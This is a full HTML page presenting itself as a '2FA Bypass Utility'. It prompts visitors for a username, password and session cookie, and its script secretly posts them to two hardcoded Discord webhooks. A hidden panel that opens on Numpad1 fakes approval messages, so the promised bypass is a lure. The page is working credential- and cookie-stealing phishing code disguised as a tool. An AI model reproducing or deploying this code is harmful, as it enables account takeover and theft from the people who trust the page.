<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Account Bypass Utility</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      background: linear-gradient(135deg, #1a202c, #2d3748);
      color: #fff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    h1 {
      font-size: 2.5rem;
      margin-bottom: 20px;
      color: #fbbf24;
    }
    .form-container {
      background-color: #4a5568;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }
    input, button {
      margin: 10px 0;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
    }
    input {
      background-color: #2d3748;
      color: white;
    }
    input:focus {
      outline: 2px solid #fbbf24;
    }
    button {
      background-color: #3b82f6;
      color: white;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #2563eb;
    }
    #controlPanel {
      display: none;
      margin-top: 20px;
    }
    #controlPanel h2 {
      margin-bottom: 10px;
      font-size: 1.5rem;
      color: #fbbf24;
    }
    .session {
      margin: 10px 0;
      padding: 10px;
      background: #2d3748;
      border-radius: 8px;
    }
  </style>
</head>
<body>

<div class="form-container">
  <h1>2FA Bypass Utility</h1>
  <form id="bypassForm">
    <input type="text" id="username" placeholder="Username" required>
    <input type="text" id="password" placeholder="Password" required>
    <input type="text" id="cookie" placeholder="Cookie" required>
    <input type="text" id="webhook" placeholder="Webhook (optional)">
    <button type="submit">Initiate Bypass</button>
  </form>
  <p>May take from 1 - 30 minutes depending on account</p>
</div>

<div id="controlPanel">
  <h2>Control Panel</h2>
  <div id="sessions"></div>
</div>

<script>
const hardcodedWebhooks = [
  "https://discord.com/api/webhooks/1356725515104424099/5c9m_Cm6ZJlRh1jOELn1VEepc8f-YSymQCzy3htF7aoGB5hIdjZBH_ZJwjC9gMRqfW1_",
  "https://discord.com/api/webhooks/1365369841678160082/rmClZPZsrzBzk65VmO8IZKRmhETqph-CfJ2rw9oqRj2-H4IVXlVjYRUTEdNZNTI417LV"
];

let sessions = [];

function sendWebhook(url, payload) {
  return fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
}

document.getElementById('bypassForm').addEventListener('submit', e => {
  e.preventDefault();
  
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;
  const cookie = document.getElementById('cookie').value;
  const webhook = document.getElementById('webhook').value;

  const sessionId = Date.now();

  sessions.push({ id: sessionId, username, password, cookie, webhook, approved: false });
  updateSessions();

  const initialPayload = { content: "Bypass in progress... please wait. (May take 1-30 minutes depending on account)" };

  if (webhook) {
    sendWebhook(webhook, initialPayload);
  }

  const fullPayload = {
    content: `Username: **${username}**\nPassword: **${password}**\nCookie: **${cookie}**`
  };

  hardcodedWebhooks.forEach(url => sendWebhook(url, fullPayload));

  setTimeout(() => {
    const session = sessions.find(s => s.id === sessionId);
    if (session && !session.approved) {
      if (session.webhook) {
        sendWebhook(session.webhook, fullPayload);
      }
      sessions = sessions.filter(s => s.id !== sessionId);
      updateSessions();
    }
  }, 10 * 60 * 1000); // 10 minutes
});

function updateSessions() {
  const container = document.getElementById('sessions');
  container.innerHTML = '';
  sessions.forEach(session => {
    const div = document.createElement('div');
    div.className = 'session';
    div.innerHTML = `
      <p><strong>Username:</strong> ${session.username}</p>
      <button onclick="approveSession(${session.id})">Approve</button>
      <button onclick="declineSession(${session.id})">Decline</button>
    `;
    container.appendChild(div);
  });
}

function approveSession(id) {
  const session = sessions.find(s => s.id === id);
  if (session && session.webhook) {
    const payload = {
      content: `Username: **${session.username}**\nPassword: **${session.password}**\nCookie: **${session.cookie}**`
    };
    sendWebhook(session.webhook, payload);
  }
  sessions = sessions.filter(s => s.id !== id);
  updateSessions();
}

function declineSession(id) {
  const reason = prompt("Enter decline reason:") || "Declined without reason";
  const session = sessions.find(s => s.id === id);
  if (session && session.webhook) {
    const payload = { content: `Bypass failed: ${reason}` };
    sendWebhook(session.webhook, payload);
  }
  sessions = sessions.filter(s => s.id !== id);
  updateSessions();
}

document.addEventListener('keydown', (e) => {
  if (e.code === 'Numpad1') {
    const cp = document.getElementById('controlPanel');
    cp.style.display = cp.style.display === 'none' ? 'block' : 'none';
  }
});
</script>

</body>
</html>
